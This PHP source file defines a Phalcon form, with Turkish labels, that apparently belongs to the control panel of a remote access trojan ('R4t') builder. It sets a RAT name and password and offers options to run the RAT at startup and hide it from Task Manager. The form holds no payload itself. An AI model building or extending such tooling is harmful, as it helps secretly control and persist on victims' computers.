<?php

use Phalcon\Forms\Form;
use Phalcon\Forms\Element\Text;
use Phalcon\Forms\Element\Password;
use Phalcon\Forms\Element\Check;
use Phalcon\Forms\Element\Hidden;
use Phalcon\Validation\Validator\PresenceOf;
use Phalcon\Validation\Validator\Email;
use Phalcon\Validation\Validator\Identical;
class R4tForm extends Form
{

    /**
     * Initialize the companies form
     */
    public function initialize($entity = null, $options = array())
    {


        $name = new Text("name");
        $name->setLabel("R4t Adı");
        $name->setFilters(array('striptags', 'string'));
        $name->addValidators(array(
            new PresenceOf(array(
                'message' => 'r4t adı gerekli'
            ))
        ));
        $this->add($name);
        $passwd = new Password("passwd");
        $passwd->setLabel("R4t Şifresi");
        $passwd->addValidators(array(
            new PresenceOf(array(
                'message' => 'r4t şifresi gerekli'
            ))
        ));
        $this->add($passwd);

        $startup = new Check("startup",['value' => 1,'class' => 'box']);
        $startup->setLabel("Başlangıçta Çalıştır");
        $startup->setDefault('0');
        $startup->addFilter('bool');
        $this->add($startup);

        $hidetaskman = new Check("hidetaskman",['value' => 1,'class' => 'box']);
        $hidetaskman->setLabel("Görev Yöneticisinden Gizle");
        $hidetaskman->setDefault('0');
        $hidetaskman->addFilter('bool');
        $this->add($hidetaskman);
        
                // CSRF
        $csrf = new Hidden('csrf');
        $csrf->addValidator(new Identical([
            'value' => $this->security->getSessionToken(),
            'message' => 'CSRF doğrulama hatası'
        ]));
        $csrf->clear();
        $this->add($csrf);
    }
    
    

}